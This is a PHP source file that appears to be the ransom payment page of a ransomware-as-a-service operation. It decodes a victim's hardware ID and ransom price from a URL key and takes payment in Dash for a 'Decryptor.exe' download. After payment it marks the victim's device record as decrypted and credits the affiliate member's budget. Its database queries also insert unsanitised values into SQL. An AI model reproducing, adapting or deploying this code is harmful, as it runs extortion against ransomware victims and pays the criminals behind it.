<?php
    $key = $_GET['key'];
    if($key == ""){
        header("Location: ".base_url()."/frontend/main");
        exit();
    }
    $key = str_replace(" " , "+" , $key);
    //require_once ("../../../application/models/aes/AesEncryption.class.php");
    require_once FCPATH."application/models/aes/AesEncryption.class.php";
    $current_path = FCPATH."ui/pages/frontend/";
    $current_url = base_url()."ui/pages/frontend/";
    $aes = new AesEncryption();
    $price = $aes->decrypt($key , "PRICE_PASS");

    $splits = explode("~~~" , $price , 3);
    $hwid = $splits[0];
    $price = $splits[1];
    $decryptor = $splits[2];
    if($price == ""){
        header("Location: ".base_url()."/frontend/main");
        return;
    }

	// bitcoin/altcoin payment box; open source

	// Change path to your files
	// --------------------------------------
	DEFINE("CRYPTOBOX_PHP_FILES_PATH", $current_path."cryptoapi_php/lib/");        	// path to directory with files: cryptobox.class.php / cryptobox.callback.php / cryptobox.newpayment.php;
												// cryptobox.newpayment.php will be automatically call through ajax/php two times - payment received/confirmed
	DEFINE("CRYPTOBOX_IMG_FILES_PATH", $current_url."cryptoapi_php/images/");	// path to directory with coin image files (directory 'images' by default)
	DEFINE("CRYPTOBOX_JS_FILES_PATH", $current_url."cryptoapi_php/js/");			// path to directory with files: ajax.min.js/support.min.js


	// Change values below
	// --------------------------------------
	DEFINE("CRYPTOBOX_LANGUAGE_HTMLID", "alang");	// any value; customize - language selection list html id; change it to any other - for example 'aa';	default 'alang'
	DEFINE("CRYPTOBOX_COINS_HTMLID", "acoin");		// any value;  customize - coins selection list html id; change it to any other - for example 'bb';	default 'acoin'
	DEFINE("CRYPTOBOX_PREFIX_HTMLID", "acrypto_");	// any value; prefix for all html elements; change it to any other - for example 'cc';	default 'acrypto_'


	// Open Source Bitcoin Payment Library
	// ---------------------------------------------------------------
	require_once(CRYPTOBOX_PHP_FILES_PATH . "cryptobox.class.php" );



	/*********************************************************/
	/****  PAYMENT BOX CONFIGURATION VARIABLES  ****/
	/*********************************************************/

	// IMPORTANT: Please read description of options here - https://gourl.io/api-php.html#options
    $filename       = "Decryptor.exe";   // filename for download
    $dir            = CRYPTOBOX_PHP_FILES_PATH;      // name of your directory with your files; nobody should have direct web access to directory
	$userID 				= $hwid;			 // place your registered userID or md5(userID) here (user1, user7, uo43DC, etc).
									// You can use php $_SESSION["userABC"] for store userID, amount, etc
									// You don't need to use userID for unregistered website visitors - $userID = "";
									// if userID is empty, system will autogenerate userID and save it in cookies
	$userFormat		= "MANUAL";		// save userID in cookies (or you can use IPADDRESS, SESSION, MANUAL)
	$orderID			= "invoice1";	    	// invoice number - 000383
	$amountUSD		= $price;			// invoice amount - 2.21 USD; or you can use - $amountUSD = convert_currency_live("EUR", "USD", 22.37); // convert 22.37EUR to USD

	$period			= "NOEXPIRY";	// one time payment, not expiry
	$def_language	= "en";			// default Language in payment box
	$def_coin		= "dash";		// default Coin in payment box
    $def_payment    =  "dash";       // default Coin in Payment Box
    $available_payments = array('dash');

	// List of coins that you accept for payments
	//$coins = array('bitcoin', 'bitcoincash', 'bitcoinsv', 'litecoin', 'dogecoin', 'dash', 'speedcoin', 'reddcoin', 'potcoin', 'feathercoin', 'vertcoin', 'peercoin', 'monetaryunit', 'universalcurrency');
	$coins = array( 'dash');  // for example, accept payments in bitcoin, bitcoincash, litecoin, dash, speedcoin

	// Create record for each your coin - https://gourl.io/editrecord/coin_boxes/0 ; and get free gourl keys
	// It is not bitcoin wallet private keys! Place GoUrl Public/Private keys below for all coins which you accept

	$all_keys = array(	"bitcoin"  => 		array("public_key" => "-your public key for Bitcoin box-",  "private_key" => "-your private key for Bitcoin box-"),
					"bitcoincash"  =>	array("public_key" => "-your public key for BitcoinCash box-",  "private_key" => "-your private key for BitcoinCash box-"),
					"litecoin" => 		array("public_key" => "-your public key for Litecoin box-", "private_key" => "-your private key for Litecoin box-")); // etc.

	// Demo Keys; for tests	(example - 5 coins)
	$all_keys = array(
					  "dash" => array(		"public_key" => $dash_public_key,
					  					"private_key" => $dash_private_key)
                    ); // 

	//  IMPORTANT: Add in file /lib/cryptobox.config.php your database settings and your gourl.io coin private keys (need for Instant Payment Notifications) -
	/* if you use demo keys above, please add to /lib/cryptobox.config.php -
		$cryptobox_private_keys = array("25654AAo79c3Bitcoin77BTCPRV0JG7w3jg0Tc5Pfi34U8o5JE", "25678AACxnGODogecoin77DOGEPRVFvl6IDdisuWHVJLo5m4eq",
					"25656AAeOGaPBitcoincash77BCHPRV8quZcxPwfEc93ArGB6D", "25657AAOwwzoLitecoin77LTCPRV7hmp8s3ew6pwgOMgxMq81F",
					"25678AACxnGODogecoin77DOGEPRVFvl6IDdisuWHVJLo5m4eq", "25658AAo79c3Dash77DASHPRVG7w3jg0Tc5Pfi34U8o5JEiTss",
					"20116AA36hi8Speedcoin77SPDPRVNOwjzYNqVn4Sn5XOwMI2c");
	 	Also create table "crypto_payments" in your database, sql code - https://github.com/cryptoapi/Payment-Gateway#mysql-table
	 	Instruction - https://gourl.io/api-php.html
 	*/

	// Re-test - all gourl public/private keys
	$def_coin = strtolower($def_coin);
	if (!in_array($def_coin, $coins)) $coins[] = $def_coin;
	foreach($coins as $v)
	{
		if (!isset($all_keys[$v]["public_key"]) || !isset($all_keys[$v]["private_key"])) die("Please add your public/private keys for '$v' in \$all_keys variable");
		elseif (!strpos($all_keys[$v]["public_key"], "PUB"))  die("Invalid public key for '$v' in \$all_keys variable");
		elseif (!strpos($all_keys[$v]["private_key"], "PRV")) die("Invalid private key for '$v' in \$all_keys variable");
		elseif (strpos(CRYPTOBOX_PRIVATE_KEYS, $all_keys[$v]["private_key"]) === false)
				die("Please add your private key for '$v' in variable \$cryptobox_private_keys, file /lib/cryptobox.config.php.");
	}


	// Current selected coin by user
    $coins_list = display_currency_box($available_payments, $def_payment, $def_language, 60, "margin: 80px 0 0 0");
	$coinName = cryptobox_selcoin($coins, $def_coin);


	// Current Coin public/private keys
	$public_key  = $all_keys[$coinName]["public_key"];
	$private_key = $all_keys[$coinName]["private_key"];



	/** PAYMENT BOX **/
	$options = array(
	    "public_key"  	=> $public_key,	// your public key from gourl.io
	    "private_key" 	=> $private_key,	// your private key from gourl.io
	    "webdev_key"  	=> "", 			// optional, gourl affiliate key
	    "orderID"     	=> $orderID, 		// order id or product name
	    "userID"      		=> $userID, 		// unique identifier for every user
	    "userFormat"  	=> $userFormat, 	// save userID in COOKIE, IPADDRESS, SESSION  or MANUAL
	    "amount"   	  	=> 0,			// product price in btc/bch/bsv/ltc/doge/etc OR setup price in USD below
	    "amountUSD"   	=> $amountUSD,	// we use product price in USD
	    "period"      		=> $period, 		// payment valid period
	    "language"	  	=> $def_language  // text on EN - english, FR - french, etc
	);

	// Initialise Payment Class
	$box = new Cryptobox ($options);

	// coin name
	$coinName = $box->coin_name();

	// php code end :)
	// ---------------------

	// NOW PLACE IN FILE "lib/cryptobox.newpayment.php", function cryptobox_new_payment(..) YOUR ACTIONS -
	// WHEN PAYMENT RECEIVED (update database, send confirmation email, update user membership, etc)
	// IPN function cryptobox_new_payment(..) will automatically appear for each new payment two times - payment received and payment confirmed
	// Read more - https://gourl.io/api-php.html#ipn

// Generate Download Link
//$download_link =  "//$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]" . (strpos($_SERVER["REQUEST_URI"], "?")?"&":"?")."dd=1";
$download_link = "http://".$_SERVER['HTTP_HOST']."/upload/decrypted/".$decryptor;
$download_link = "href='".htmlspecialchars($download_link, ENT_QUOTES, 'UTF-8')."'";

// Warning message if not paid
if (!$box->is_paid())
    $download_link = "onclick='alert(\"You need to send ".$coinName."s first !\")' href='#a'";

// Check if file exists on your server
//$file = rtrim($dir, "/ ")."/".$filename;
//if (!file_exists($file))   echo "<h1><center><font color=red>Warning: $file not exists</font></center></h1>";

// User Paid - Send file to user browser
if ($box->is_paid() && isset($_GET["dd"]) && $_GET["dd"] == "1")
{
    /**
     * Finishing Payment
     */
    $query = "select * from device_tb where hwid = '$hwid';";
    $result = $box->run_sql($query);
    $owner = $result->owner;
    $status = $result->status;

    if($status == 'Encrypted'){
        $query = "update device_tb set status='Payed&Decrypted' , price=$price where hwid='$hwid'";
        $result = $box->run_sql($query);

        $query = "update member_tb set budget=budget+$price where member_key='$owner';";
        $result = $box->run_sql($query);
        echo json_encode($result);
    }

    // Starting Download
    $size = filesize($file);
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename='.basename($file));
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . $size);
    readfile($file);

    // Set Status - User Downloaded File
    if ($size) $box->set_status_processed();

    die;
}
?>


<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="">
    <title>Payment Box</title>

    <!-- Bootstrap4 CSS - -->
    <link rel="stylesheet" href="https://bootswatch.com/4/darkly/bootstrap.css" crossorigin="anonymous">

    <!-- Note - If your website not use Bootstrap4 CSS as main style, please use custom css style below and delete css line above.
    It isolate Bootstrap CSS to a particular class 'bootstrapiso' to avoid css conflicts with your site main css style -->
    <!-- <link rel="stylesheet" href="css/darkly.min.css" crossorigin="anonymous"> -->


    <!-- JS -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" crossorigin="anonymous"></script>
    <script defer src="https://use.fontawesome.com/releases/v5.12.0/js/all.js" crossorigin="anonymous"></script>
    <script src="<?php echo CRYPTOBOX_JS_FILES_PATH; ?>support.min.js" crossorigin="anonymous"></script>

    <!-- CSS for Payment Box -->
    <style>
            html { font-size: 14px; }
            @media (min-width: 768px) { html { font-size: 16px; } .tooltip-inner { max-width: 350px; } }
            .mncrpt .container { max-width: 980px; }
            .mncrpt .box-shadow { box-shadow: 0 .25rem .75rem rgba(0, 0, 0, .05); }
            img.radioimage-select { padding: 7px; border: solid 2px #ffffff; margin: 7px 1px; cursor: pointer; box-shadow: none; }
            img.radioimage-select:hover { border: solid 2px #a5c1e5; }
            img.radioimage-select.radioimage-checked { border: solid 2px #7db8d9; background-color: #f4f8fb; }
    </style>
  </head>

  <body style="padding: 20px">
<div class="row">
    <div class="col-md-6">
        <?php

        // Text above payment box
        $custom_text  = "<p class='lead'>Demo Text - Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</p>";
        $custom_text .= "<p class='lead'>Please contact us for any questions on aaa@example.com</p>";
        $custom_text = "";

        // Display payment box
        echo $box->display_cryptobox_bootstrap($coins, $def_coin, $def_language, $custom_text, 71, 200, true, "default", "default", 250, "", "ajax", false);


        // You can setup method='curl' in function above and use code below on this webpage -
        // if successful bitcoin payment received .... allow user to access your premium data/files/products, etc.
        // if ($box->is_paid()) { ... your code here ... }


        ?>
    </div>
    <div class="col-md-6">
        <div align='center'>
            <br><br><br><br><br><br><br><br><br>
            <br><br><br><h1>File: Decryptor.exe</h1>

            Price: <?= $amountUSD ?> US$<br>

            <a <?= $download_link ?>><img alt='Download File' border='0' src='https://gourl.io/images/zip.png'></a><br>
            <a <?= $download_link ?>>Download File</a>

            <br><br><br><br><br><br>
        </div>
    </div>
</div>




  </body>
</html>